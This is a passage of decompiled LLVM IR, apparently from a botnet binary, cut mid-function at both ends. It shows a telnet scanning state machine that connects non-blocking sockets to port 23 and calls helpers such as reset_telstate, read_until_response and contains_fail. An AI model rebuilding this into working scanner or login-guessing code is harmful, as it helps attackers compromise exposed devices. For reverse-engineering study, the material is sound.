  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v5_804a6aa = load i8, i8* %v4_804a61e, align 1
  %v10_804a6af = icmp eq i8 %v5_804a6aa, 9
  %v1_804a6b1 = icmp eq i1 %v10_804a6af, false
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  br i1 %v1_804a6b1, label %dec_label_pc_804a6d3, label %dec_label_pc_804a6b3

dec_label_pc_804a6b3:                             ; preds = %dec_label_pc_804a606
  store i8 1, i8* %v4_804a52d, align 1
  br label %dec_label_pc_804b459

dec_label_pc_804a6d3:                             ; preds = %dec_label_pc_804a606
  %v5_804a6e9 = load i8, i8* %v4_804a665, align 2
  %v6_804a6e9 = zext i8 %v5_804a6e9 to i32
  store i32 %v6_804a6e9, i32* %eax.global-to-local, align 4
  %v10_804a6ee = icmp eq i8 %v5_804a6e9, 9
  %v1_804a6f0 = icmp eq i1 %v10_804a6ee, false
  br i1 %v1_804a6f0, label %dec_label_pc_804a712, label %dec_label_pc_804a6f2

dec_label_pc_804a6f2:                             ; preds = %dec_label_pc_804a6d3
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a52d, align 1
  br label %dec_label_pc_804b459

dec_label_pc_804a712:                             ; preds = %dec_label_pc_804a6d3, %dec_label_pc_804a5e3, %dec_label_pc_804a53a
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804a71b = load i32, i32* @esp, align 4
  %v1_804a71b = inttoptr i32 %v0_804a71b to i32*
  store i32 23, i32* %v1_804a71b, align 4
  %v0_804a722 = load i32, i32* %stack_var_-604, align 4
  %v1_804a722 = trunc i32 %v0_804a722 to i16
  %v2_804a722 = call i32 @htons(i16 %v1_804a722)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  %v1_804a75f = add i32 %v2_804a49f, 4
  store i32 %v1_804a75f, i32* %eax.global-to-local, align 4
  %v1_804a762 = inttoptr i32 %v1_804a75f to i32*
  %v2_804a762 = load i32, i32* %v1_804a762, align 4
  store i32 %v2_804a762, i32* %eax.global-to-local, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804a76d = load i32, i32* @esp, align 4
  %v1_804a76d = add i32 %v0_804a76d, 8
  %v2_804a76d = inttoptr i32 %v1_804a76d to i32*
  store i32 0, i32* %v2_804a76d, align 4
  %v0_804a775 = load i32, i32* @esp, align 4
  %v1_804a775 = add i32 %v0_804a775, 4
  %v2_804a775 = inttoptr i32 %v1_804a775 to i32*
  store i32 1, i32* %v2_804a775, align 4
  %v0_804a77d = load i32, i32* @esp, align 4
  %v1_804a77d = inttoptr i32 %v0_804a77d to i32*
  store i32 2, i32* %v1_804a77d, align 4
  %v2_804a784 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804a722, 65536
  %v3_804a784 = sdiv i32 %sext, 65536
  %v4_804a784 = call i32 @socket(i32 %v3_804a784, i32 %v2_804a762, i32 %v2_804a784)
  store i32 %v4_804a784, i32* @esi, align 4
  %v0_804a78e = load i32, i32* @ebx, align 4
  %v2_804a79e = mul i32 %v0_804a78e, 28
  %v3_804a7a0 = add i32 %v2_804a79e, %v2_804a3a8
  %v4_804a7a0 = inttoptr i32 %v3_804a7a0 to i32*
  store i32 %v4_804a784, i32* %v4_804a7a0, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804a7b9 = inttoptr i32 %v2_804a49f to i32*
  %v4_804a7b9 = load i32, i32* %v3_804a7b9, align 4
  store i32 %v4_804a7b9, i32* %eax.global-to-local, align 4
  %v10_804a7bc = icmp eq i32 %v4_804a7b9, -1
  br i1 %v10_804a7bc, label %dec_label_pc_804b459, label %dec_label_pc_804a7c5

dec_label_pc_804a7c5:                             ; preds = %dec_label_pc_804a712
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804a7db = load i32, i32* %v3_804a7b9, align 4
  store i32 %v4_804a7db, i32* %eax.global-to-local, align 4
  %v0_804a7de = load i32, i32* @esp, align 4
  %v1_804a7de = add i32 %v0_804a7de, 8
  %v2_804a7de = inttoptr i32 %v1_804a7de to i32*
  store i32 0, i32* %v2_804a7de, align 4
  %v0_804a7e6 = load i32, i32* @esp, align 4
  %v1_804a7e6 = add i32 %v0_804a7e6, 4
  %v2_804a7e6 = inttoptr i32 %v1_804a7e6 to i32*
  store i32 3, i32* %v2_804a7e6, align 4
  %v0_804a7ee = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7ee = load i32, i32* @esp, align 4
  %v2_804a7ee = inttoptr i32 %v1_804a7ee to i32*
  store i32 %v0_804a7ee, i32* %v2_804a7ee, align 4
  %v1_804a7f1 = load i32, i32* %stack_var_-596, align 4
  %v3_804a7f1 = call i32 @__libc_fcntl(i32 %v2_804a762, i32 %v1_804a7f1, i32 0)
  %v1_804a7f8 = or i32 %v3_804a7f1, 2048
  store i32 %v1_804a7f8, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804a814 = load i32, i32* %v3_804a7b9, align 4
  store i32 %v4_804a814, i32* %eax.global-to-local, align 4
  %v1_804a817 = load i32, i32* @esp, align 4
  %v2_804a817 = add i32 %v1_804a817, 8
  %v3_804a817 = inttoptr i32 %v2_804a817 to i32*
  store i32 %v1_804a7f8, i32* %v3_804a817, align 4
  %v0_804a81b = load i32, i32* @esp, align 4
  %v1_804a81b = add i32 %v0_804a81b, 4
  %v2_804a81b = inttoptr i32 %v1_804a81b to i32*
  store i32 4, i32* %v2_804a81b, align 4
  %v0_804a823 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a823 = load i32, i32* @esp, align 4
  %v2_804a823 = inttoptr i32 %v1_804a823 to i32*
  store i32 %v0_804a823, i32* %v2_804a823, align 4
  %v1_804a826 = load i32, i32* %stack_var_-596, align 4
  %v3_804a826 = call i32 @__libc_fcntl(i32 %v2_804a762, i32 %v1_804a826, i32 0)
  store i32 %v2_804a331, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804a847 = load i32, i32* %v3_804a7b9, align 4
  store i32 %v4_804a847, i32* %eax.global-to-local, align 4
  %v0_804a84a = load i32, i32* @esp, align 4
  %v1_804a84a = add i32 %v0_804a84a, 8
  %v2_804a84a = inttoptr i32 %v1_804a84a to i32*
  store i32 16, i32* %v2_804a84a, align 4
  %v1_804a852 = load i32, i32* @esp, align 4
  %v2_804a852 = add i32 %v1_804a852, 4
  %v3_804a852 = inttoptr i32 %v2_804a852 to i32*
  store i32 %v2_804a331, i32* %v3_804a852, align 4
  %v0_804a856 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a856 = load i32, i32* @esp, align 4
  %v2_804a856 = inttoptr i32 %v1_804a856 to i32*
  store i32 %v0_804a856, i32* %v2_804a856, align 4
  %v1_804a859 = load i32, i32* %stack_var_-596, align 4
  %v3_804a859 = call i32 @__libc_connect(i32 %v2_804a762, i32 %v1_804a859, i32 0)
  store i32 %v3_804a859, i32* %eax.global-to-local, align 4
  %v10_804a85e = icmp eq i32 %v3_804a859, -1
  %v1_804a861 = icmp eq i1 %v10_804a85e, false
  br i1 %v1_804a861, label %dec_label_pc_804a895, label %dec_label_pc_804a863

dec_label_pc_804a863:                             ; preds = %dec_label_pc_804a7c5
  %v1_804a863 = call i32 @__errno_location(i32 %v2_804a762)
  store i32 %v1_804a863, i32* %eax.global-to-local, align 4
  %v1_804a868 = inttoptr i32 %v1_804a863 to i32*
  %v2_804a868 = load i32, i32* %v1_804a868, align 4
  store i32 %v2_804a868, i32* %eax.global-to-local, align 4
  %v9_804a86a = icmp eq i32 %v2_804a868, 115
  br i1 %v9_804a86a, label %dec_label_pc_804a895, label %dec_label_pc_804a86f

dec_label_pc_804a86f:                             ; preds = %dec_label_pc_804a863
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804a888 = load i32, i32* @esp, align 4
  %v2_804a888 = inttoptr i32 %v1_804a888 to i32*
  store i32 %v2_804a49f, i32* %v2_804a888, align 4
  %v1_804a88b = call i32 @reset_telstate(i32 %v2_804a762)
  store i32 %v1_804a88b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804a895:                             ; preds = %dec_label_pc_804a863, %dec_label_pc_804a7c5
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804a8ae = load i32, i32* @esp, align 4
  %v1_804a8ae = add i32 %v0_804a8ae, 4
  %v2_804a8ae = inttoptr i32 %v1_804a8ae to i32*
  store i32 1, i32* %v2_804a8ae, align 4
  %v0_804a8b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a8b6 = load i32, i32* @esp, align 4
  %v2_804a8b6 = inttoptr i32 %v1_804a8b6 to i32*
  store i32 %v0_804a8b6, i32* %v2_804a8b6, align 4
  %v1_804a8b9 = load i32, i32* %stack_var_-596, align 4
  %v2_804a8b9 = inttoptr i32 %v2_804a762 to i32*
  %v3_804a8b9 = call i32 @advance_state(i32* %v2_804a8b9, i32 %v1_804a8b9)
  store i32 %v3_804a8b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804a8c3:                             ; preds = %dec_label_pc_804a4d7
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a8cd, i32* @edi, align 4
  %v5_804a8d4 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804a8f2 = inttoptr i32 %v2_804a49f to i32*
  %v4_804a8f2 = load i32, i32* %v3_804a8f2, align 4
  %v2_804a8f7 = udiv i32 %v4_804a8f2, 32
  store i32 %v2_804a8f7, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804a910 = load i32, i32* %v3_804a8f2, align 4
  %v1_804a913 = urem i32 %v4_804a910, 32
  store i32 %v1_804a913, i32* %eax.global-to-local, align 4
  %v0_804a916 = load i32, i32* @ebp, align 4
  %v2_804a916 = mul nuw nsw i32 %v2_804a8f7, 4
  %v3_804a916 = add nsw i32 %v2_804a916, -312
  %v4_804a916 = add i32 %v3_804a916, %v0_804a916
  %v5_804a916 = inttoptr i32 %v4_804a916 to i32*
  %v6_804a916 = load i32, i32* %v5_804a916, align 4
  %v9_804a916 = shl i32 1, %v1_804a913
  %v12_804a916 = or i32 %v6_804a916, %v9_804a916
  store i32 %v12_804a916, i32* %v5_804a916, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804a947 = load i32, i32* %v3_804a8f2, align 4
  %v1_804a94a = add i32 %v4_804a947, 1
  store i32 %v1_804a94a, i32* %edx.global-to-local, align 4
  %v1_804a953 = load i32, i32* @esp, align 4
  %v2_804a953 = add i32 %v1_804a953, 16
  %v3_804a953 = inttoptr i32 %v2_804a953 to i32*
  store i32 %v2_804a94d, i32* %v3_804a953, align 4
  %v0_804a957 = load i32, i32* @esp, align 4
  %v1_804a957 = add i32 %v0_804a957, 12
  %v2_804a957 = inttoptr i32 %v1_804a957 to i32*
  store i32 0, i32* %v2_804a957, align 4
  store i32 %v2_804a8cd, i32* %eax.global-to-local, align 4
  %v1_804a965 = load i32, i32* @esp, align 4
  %v2_804a965 = add i32 %v1_804a965, 8
  %v3_804a965 = inttoptr i32 %v2_804a965 to i32*
  store i32 %v2_804a8cd, i32* %v3_804a965, align 4
  %v0_804a969 = load i32, i32* @esp, align 4
  %v1_804a969 = add i32 %v0_804a969, 4
  %v2_804a969 = inttoptr i32 %v1_804a969 to i32*
  store i32 0, i32* %v2_804a969, align 4
  %v0_804a971 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a971 = load i32, i32* @esp, align 4
  %v2_804a971 = inttoptr i32 %v1_804a971 to i32*
  store i32 %v0_804a971, i32* %v2_804a971, align 4
  %v0_804a974 = load i32, i32* %stack_var_-324, align 4
  %v2_804a974 = load i32, i32* %stack_var_-316, align 4
  %v5_804a974 = call i32 @__libc_select(i32 %v0_804a974, i32 %arg1, i32 %v2_804a974, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a974, i32* %eax.global-to-local, align 4
  %v12_804a97c = icmp eq i32 %v5_804a974, 1
  %v1_804a980 = icmp eq i1 %v12_804a97c, false
  br i1 %v1_804a980, label %dec_label_pc_804aaa3, label %dec_label_pc_804a986

dec_label_pc_804a986:                             ; preds = %dec_label_pc_804a8c3
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804a9b0 = load i32, i32* %v3_804a8f2, align 4
  store i32 %v4_804a9b0, i32* %edx.global-to-local, align 4
  %v1_804a9b9 = load i32, i32* @esp, align 4
  %v2_804a9b9 = add i32 %v1_804a9b9, 16
  %v3_804a9b9 = inttoptr i32 %v2_804a9b9 to i32*
  store i32 %v2_804a9b3, i32* %v3_804a9b9, align 4
  store i32 %v2_804a9bd, i32* %eax.global-to-local, align 4
  %v1_804a9c3 = load i32, i32* @esp, align 4
  %v2_804a9c3 = add i32 %v1_804a9c3, 12
  %v3_804a9c3 = inttoptr i32 %v2_804a9c3 to i32*
  store i32 %v2_804a9bd, i32* %v3_804a9c3, align 4
  %v0_804a9c7 = load i32, i32* @esp, align 4
  %v1_804a9c7 = add i32 %v0_804a9c7, 8
  %v2_804a9c7 = inttoptr i32 %v1_804a9c7 to i32*
  store i32 4, i32* %v2_804a9c7, align 4
  %v0_804a9cf = load i32, i32* @esp, align 4
  %v1_804a9cf = add i32 %v0_804a9cf, 4
  %v2_804a9cf = inttoptr i32 %v1_804a9cf to i32*
  store i32 1, i32* %v2_804a9cf, align 4
  %v0_804a9d7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a9d7 = load i32, i32* @esp, align 4
  %v2_804a9d7 = inttoptr i32 %v1_804a9d7 to i32*
  store i32 %v0_804a9d7, i32* %v2_804a9d7, align 4
  %v0_804a9da = load i32, i32* %stack_var_-332, align 4
  %v1_804a9da = load i32, i32* %stack_var_-328, align 4
  %v2_804a9da = load i32, i32* %stack_var_-324, align 4
  %v4_804a9da = load i32, i32* %stack_var_-316, align 4
  %v5_804a9da = call i32 @getsockopt(i32 %v0_804a9da, i32 %v1_804a9da, i32 %v2_804a9da, i32 %arg1, i32 %v4_804a9da)
  %v3_804a9df = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804a9df, i32* %eax.global-to-local, align 4
  %v1_804a9e5 = icmp eq i32 %v3_804a9df, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804a9e5, label %dec_label_pc_804aa0f, label %dec_label_pc_804a9e9

dec_label_pc_804a9e9:                             ; preds = %dec_label_pc_804a986
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804aa02 = load i32, i32* @esp, align 4
  %v2_804aa02 = inttoptr i32 %v1_804aa02 to i32*
  store i32 %v2_804a49f, i32* %v2_804aa02, align 4
  %v0_804aa05 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa05 = call i32 @reset_telstate(i32 %v0_804aa05)
  store i32 %v1_804aa05, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804aa0f:                             ; preds = %dec_label_pc_804a986
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804aa25 = load i32, i32* %v3_804a8f2, align 4
  store i32 %v4_804aa25, i32* %eax.global-to-local, align 4
  %v0_804aa28 = load i32, i32* @esp, align 4
  %v1_804aa28 = add i32 %v0_804aa28, 8
  %v2_804aa28 = inttoptr i32 %v1_804aa28 to i32*
  store i32 0, i32* %v2_804aa28, align 4
  %v0_804aa30 = load i32, i32* @esp, align 4
  %v1_804aa30 = add i32 %v0_804aa30, 4
  %v2_804aa30 = inttoptr i32 %v1_804aa30 to i32*
  store i32 3, i32* %v2_804aa30, align 4
  %v0_804aa38 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa38 = load i32, i32* @esp, align 4
  %v2_804aa38 = inttoptr i32 %v1_804aa38 to i32*
  store i32 %v0_804aa38, i32* %v2_804aa38, align 4
  %v0_804aa3b = load i32, i32* %stack_var_-332, align 4
  %v1_804aa3b = load i32, i32* %stack_var_-328, align 4
  %v2_804aa3b = load i32, i32* %stack_var_-324, align 4
  %v3_804aa3b = call i32 @__libc_fcntl(i32 %v0_804aa3b, i32 %v1_804aa3b, i32 %v2_804aa3b)
  %v1_804aa42 = and i32 %v3_804aa3b, -2049
  store i32 %v1_804aa42, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804aa5e = load i32, i32* %v3_804a8f2, align 4
  store i32 %v4_804aa5e, i32* %eax.global-to-local, align 4
  %v1_804aa61 = load i32, i32* @esp, align 4
  %v2_804aa61 = add i32 %v1_804aa61, 8
  %v3_804aa61 = inttoptr i32 %v2_804aa61 to i32*
  store i32 %v1_804aa42, i32* %v3_804aa61, align 4
  %v0_804aa65 = load i32, i32* @esp, align 4
  %v1_804aa65 = add i32 %v0_804aa65, 4
  %v2_804aa65 = inttoptr i32 %v1_804aa65 to i32*
  store i32 4, i32* %v2_804aa65, align 4
  %v0_804aa6d = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa6d = load i32, i32* @esp, align 4
  %v2_804aa6d = inttoptr i32 %v1_804aa6d to i32*
  store i32 %v0_804aa6d, i32* %v2_804aa6d, align 4
  %v0_804aa70 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa70 = load i32, i32* %stack_var_-328, align 4
  %v2_804aa70 = load i32, i32* %stack_var_-324, align 4
  %v3_804aa70 = call i32 @__libc_fcntl(i32 %v0_804aa70, i32 %v1_804aa70, i32 %v2_804aa70)
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804aa8e = load i32, i32* @esp, align 4
  %v1_804aa8e = add i32 %v0_804aa8e, 4
  %v2_804aa8e = inttoptr i32 %v1_804aa8e to i32*
  store i32 2, i32* %v2_804aa8e, align 4
  %v0_804aa96 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa96 = load i32, i32* @esp, align 4
  %v2_804aa96 = inttoptr i32 %v1_804aa96 to i32*
  store i32 %v0_804aa96, i32* %v2_804aa96, align 4
  %v0_804aa99 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa99 = load i32, i32* %stack_var_-328, align 4
  %v2_804aa99 = inttoptr i32 %v0_804aa99 to i32*
  %v3_804aa99 = call i32 @advance_state(i32* %v2_804aa99, i32 %v1_804aa99)
  store i32 %v3_804aa99, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804aaa3:                             ; preds = %dec_label_pc_804a8c3
  %v13_804aaa3 = icmp eq i32 %v5_804a974, -1
  %v1_804aaa7 = icmp eq i1 %v13_804aaa3, false
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804aaa7, label %dec_label_pc_804aacf, label %dec_label_pc_804aaa9

dec_label_pc_804aaa9:                             ; preds = %dec_label_pc_804aaa3
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804aac2 = load i32, i32* @esp, align 4
  %v2_804aac2 = inttoptr i32 %v1_804aac2 to i32*
  store i32 %v2_804a49f, i32* %v2_804aac2, align 4
  %v1_804aac5 = call i32 @reset_telstate(i32 %v5_804a974)
  store i32 %v1_804aac5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804aacf:                             ; preds = %dec_label_pc_804aaa3
  store i32 %v1_804a4a1, i32* %eax.global-to-local, align 4
  %v2_804aaea = load i32, i32* %v1_804a4a4, align 4
  store i32 %v2_804aaea, i32* %eax.global-to-local, align 4
  %v1_804aaec = add i32 %v2_804aaea, 5
  store i32 %v1_804aaec, i32* @ebx, align 4
  %v0_804aaef = load i32, i32* @esp, align 4
  %v1_804aaef = inttoptr i32 %v0_804aaef to i32*
  store i32 0, i32* %v1_804aaef, align 4
  %v1_804aaf6 = inttoptr i32 %v5_804a974 to i32*
  %v2_804aaf6 = call i32 @__GI_time(i32* %v1_804aaf6)
  store i32 %v2_804aaf6, i32* %eax.global-to-local, align 4
  %v0_804aafb = load i32, i32* @ebx, align 4
  %v7_804aafb = icmp ult i32 %v0_804aafb, %v2_804aaf6
  %v1_804aafd = icmp eq i1 %v7_804aafb, false
  br i1 %v1_804aafd, label %dec_label_pc_804b459, label %dec_label_pc_804ab03

dec_label_pc_804ab03:                             ; preds = %dec_label_pc_804aacf
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804ab1c = load i32, i32* @esp, align 4
  %v2_804ab1c = inttoptr i32 %v1_804ab1c to i32*
  store i32 %v2_804a49f, i32* %v2_804ab1c, align 4
  %v0_804ab1f = load i32, i32* %stack_var_-332, align 4
  %v1_804ab1f = call i32 @reset_telstate(i32 %v0_804ab1f)
  store i32 %v1_804ab1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804ab29:                             ; preds = %dec_label_pc_804a4d7
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  %v1_804ab41 = add i32 %v2_804a49f, 24
  store i32 %v1_804ab41, i32* %eax.global-to-local, align 4
  %v1_804ab44 = inttoptr i32 %v1_804ab41 to i32*
  %v2_804ab44 = load i32, i32* %v1_804ab44, align 4
  store i32 %v2_804ab44, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804ab5c = inttoptr i32 %v2_804a49f to i32*
  %v4_804ab5c = load i32, i32* %v3_804ab5c, align 4
  store i32 %v4_804ab5c, i32* %edx.global-to-local, align 4
  %v0_804ab5f = load i32, i32* @esp, align 4
  %v1_804ab5f = add i32 %v0_804ab5f, 16
  %v2_804ab5f = inttoptr i32 %v1_804ab5f to i32*
  store i32 134578572, i32* %v2_804ab5f, align 4
  %v0_804ab67 = load i32, i32* @esp, align 4
  %v1_804ab67 = add i32 %v0_804ab67, 12
  %v2_804ab67 = inttoptr i32 %v1_804ab67 to i32*
  store i32 1024, i32* %v2_804ab67, align 4
  %v0_804ab6f = load i32, i32* @ebx, align 4
  %v1_804ab6f = load i32, i32* @esp, align 4
  %v2_804ab6f = add i32 %v1_804ab6f, 8
  %v3_804ab6f = inttoptr i32 %v2_804ab6f to i32*
  store i32 %v0_804ab6f, i32* %v3_804ab6f, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804ab76 = load i32, i32* @esp, align 4
  %v2_804ab76 = add i32 %v1_804ab76, 4
  %v3_804ab76 = inttoptr i32 %v2_804ab76 to i32*
  store i32 %arg1, i32* %v3_804ab76, align 4
  %v0_804ab7a = load i32, i32* %edx.global-to-local, align 4
  %v1_804ab7a = load i32, i32* @esp, align 4
  %v2_804ab7a = inttoptr i32 %v1_804ab7a to i32*
  store i32 %v0_804ab7a, i32* %v2_804ab7a, align 4
  %v1_804ab7d = call i32 @read_until_response(i32 %v6_804a4ed)
  %v1_804ab82 = icmp eq i32 %v1_804ab7d, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  br i1 %v1_804ab82, label %dec_label_pc_804ac0f, label %dec_label_pc_804ab8a

dec_label_pc_804ab8a:                             ; preds = %dec_label_pc_804ab29
  store i32 %v1_804ab41, i32* %eax.global-to-local, align 4
  %v2_804aba5 = load i32, i32* %v1_804ab44, align 4
  store i32 %v2_804aba5, i32* %eax.global-to-local, align 4
  %v1_804aba7 = load i32, i32* @esp, align 4
  %v2_804aba7 = inttoptr i32 %v1_804aba7 to i32*
  store i32 %v2_804aba5, i32* %v2_804aba7, align 4
  %v0_804abaa = load i32, i32* %stack_var_-332, align 4
  %v1_804abaa = call i32 @contains_fail(i32 %v0_804abaa)
  %v1_804abaf = icmp eq i32 %v1_804abaa, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804abfa = load i32, i32* @esp, align 4
  %v1_804abfa = add i32 %v0_804abfa, 4
  %v2_804abfa = inttoptr i32 %v1_804abfa to i32*
  br i1 %v1_804abaf, label %dec_label_pc_804abe1, label %dec_label_pc_804abb3

dec_label_pc_804abb3:                             ; preds = %dec_label_pc_804ab8a
  store i32 0, i32* %v2_804abfa, align 4
  %v0_804abd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804abd4 = load i32, i32* @esp, align 4
  %v2_804abd4 = inttoptr i32 %v1_804abd4 to i32*
  store i32 %v0_804abd4, i32* %v2_804abd4, align 4
  %v0_804abd7 = load i32, i32* %stack_var_-332, align 4
  %v1_804abd7 = load i32, i32* %stack_var_-328, align 4
  %v2_804abd7 = inttoptr i32 %v0_804abd7 to i32*
  %v3_804abd7 = call i32 @advance_state(i32* %v2_804abd7, i32 %v1_804abd7)
  store i32 %v3_804abd7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804abe1:                             ; preds = %dec_label_pc_804ab8a
  store i32 3, i32* %v2_804abfa, align 4
  %v0_804ac02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac02 = load i32, i32* @esp, align 4
  %v2_804ac02 = inttoptr i32 %v1_804ac02 to i32*
  store i32 %v0_804ac02, i32* %v2_804ac02, align 4
  %v0_804ac05 = load i32, i32* %stack_var_-332, align 4
  %v1_804ac05 = load i32, i32* %stack_var_-328, align 4
  %v2_804ac05 = inttoptr i32 %v0_804ac05 to i32*
  %v3_804ac05 = call i32 @advance_state(i32* %v2_804ac05, i32 %v1_804ac05)
  store i32 %v3_804ac05, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804ac0f:                             ; preds = %dec_label_pc_804ab29
  store i32 %v1_804a4a1, i32* %eax.global-to-local, align 4
  %v2_804ac2a = load i32, i32* %v1_804a4a4, align 4
  store i32 %v2_804ac2a, i32* %eax.global-to-local, align 4
  %v1_804ac2c = add i32 %v2_804ac2a, 7
  store i32 %v1_804ac2c, i32* @ebx, align 4
  %v0_804ac2f = load i32, i32* @esp, align 4
  %v1_804ac2f = inttoptr i32 %v0_804ac2f to i32*
  store i32 0, i32* %v1_804ac2f, align 4
  %v0_804ac36 = load i32, i32* %stack_var_-332, align 4
  %v1_804ac36 = inttoptr i32 %v0_804ac36 to i32*
  %v2_804ac36 = call i32 @__GI_time(i32* %v1_804ac36)
  store i32 %v2_804ac36, i32* %eax.global-to-local, align 4
  %v0_804ac3b = load i32, i32* @ebx, align 4
  %v7_804ac3b = icmp ult i32 %v0_804ac3b, %v2_804ac36
  %v1_804ac3d = icmp eq i1 %v7_804ac3b, false
  br i1 %v1_804ac3d, label %dec_label_pc_804b459, label %dec_label_pc_804ac43

dec_label_pc_804ac43:                             ; preds = %dec_label_pc_804ac0f
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804ac5c = load i32, i32* @esp, align 4
  %v2_804ac5c = inttoptr i32 %v1_804ac5c to i32*
  store i32 %v2_804a49f, i32* %v2_804ac5c, align 4
  %v0_804ac5f = load i32, i32* %stack_var_-332, align 4
  %v1_804ac5f = call i32 @reset_telstate(i32 %v0_804ac5f)
  store i32 %v1_804ac5f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804ac69:                             ; preds = %dec_label_pc_804a4d7
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804ac7f = add i32 %v2_804a665, %v2_804a49d
  %v4_804ac7f = inttoptr i32 %v3_804ac7f to i8*
  %v5_804ac7f = load i8, i8* %v4_804ac7f, align 2
  %v6_804ac7f = zext i8 %v5_804ac7f to i32
  store i32 %v6_804ac7f, i32* %eax.global-to-local, align 4
  %v1_804ac87 = mul nuw nsw i32 %v6_804ac7f, 4
  %v2_804ac87 = add nuw nsw i32 %v1_804ac87, 134578400
  %v3_804ac87 = inttoptr i32 %v2_804ac87 to i32*
  %v4_804ac87 = load i32, i32* %v3_804ac87, align 4
  %v1_804ac99 = and i32 %v4_804ac87, -256
  store i32 %v1_804ac99, i32* %eax.global-to-local, align 4
  %v4_804ac9c = inttoptr i32 %v4_804ac87 to i8*
  store i32 %v4_804ac87, i32* @edi, align 4
  %v3_804aca2 = call i32 @_strlen(i8* %v4_804ac9c)
  store i32 %v3_804aca2, i32* @esi, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
